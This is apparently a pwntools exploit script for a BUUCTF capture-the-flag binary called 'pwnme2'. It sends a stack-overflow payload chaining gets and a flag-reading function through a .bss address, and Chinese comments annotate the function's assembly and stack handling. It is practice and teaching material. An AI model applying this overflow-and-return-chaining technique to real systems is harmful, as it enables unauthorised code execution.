from pwn import *

r = remote('node5.buuoj.cn', 26944)
# r = process('pwnme2')
context.log_level = 'debug'

string_bss_addr = 0x804A060
exec_string = 0x80485CB
gets_addr = 0x8048440

# 溢出->向string_bss地址写入flag字符串->返回到exec_string读取flag
payload = b'A' * (0x6C + 4) + p32(gets_addr) + p32(exec_string) + p32(string_bss_addr)
r.sendlineafter(b'input:', payload)
r.sendline(b'flag')
r.interactive()

'''
为啥用strcpy来溢出而不是gets？查看汇编：
lea     ecx, [esp+4]         ; 保存原栈中第一个参数的地址（esp+4）到ecx
and     esp, 0FFFFFFF0h      ; 栈指针按16字节对齐（清除低4位）
push    dword ptr [ecx-4]    ; 将原栈顶的返回地址（ecx-4即原esp）压入新栈
push    ebp                  ; 保存旧的基址指针
mov     ebp, esp             ; 设置新的基址指针
push    ecx                  ; 保存ecx（原参数地址）到栈中，用于后续恢复栈
sub     esp, 84h             ; 分配0x84字节（132字节）的局部变量空间（如s数组）
..............
mov     eax, 0               ; 函数返回值设为0（对应C语言的return 0）
mov     ecx, [ebp+var_4]     ; 恢复之前保存的ecx（原参数地址）
leave                        ; 等价于mov esp, ebp; pop ebp（恢复栈帧）
lea     esp, [ecx-4]         ; 恢复栈指针到函数调用前的状态
retn                         ; 返回调用者
'''